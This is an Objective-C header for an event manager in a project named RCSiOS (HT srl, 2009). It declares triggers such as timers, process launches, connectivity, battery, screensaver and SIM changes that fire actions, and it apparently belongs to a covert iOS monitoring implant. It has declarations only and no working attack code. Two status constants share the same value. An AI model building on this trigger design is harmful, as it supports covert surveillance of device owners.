/*
 * RCSiOS - Events
 *  Provides all the events which should trigger an action
 *
 *
 * Created on 26/05/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#ifndef __RCSIEventManager_h__
#define __RCSIEventManager_h__
#import <mach/message.h>

#import "RCSICommon.h"
#import "RCSINotificationSupport.h"
#import "RCSIConfManager.h"

#define PROCESS 0
#define WIN_TITLE 1


@interface _i_EventManager : NSObject
{
  NSMutableArray  *eventsList;
  NSMutableArray  *eventsMessageQueue;
  NSMachPort      *notificationPort;
  
#define EVENT_MANAGER_RUNNING  0
#define EVENT_MANAGER_STOPPING 2
#define EVENT_MANAGER_STOPPED  2
  int             eventManagerStatus; 

}

@property (readonly) NSMachPort *notificationPort;

- (id)init;

- (void)addEventTimerInstance:(NSMutableDictionary*)theEvent;
- (void)addEventProcessInstance:(NSMutableDictionary*)theEvent;
- (void)addEventConnectivityInstance:(NSMutableDictionary*)theEvent;
- (void)addEventBatteryInstance:(NSMutableDictionary*)theEvent;
- (void)addEventACInstance:(NSMutableDictionary*)theEvent;
- (void)addEventScreensaverInstance:(NSMutableDictionary*)theEvent;
- (void)addEventSimChangeInstance:(NSMutableDictionary*)theEvent;
- (BOOL)triggerAction:(uint)anAction;

- (BOOL)start;
- (void)stop;

@end

#endif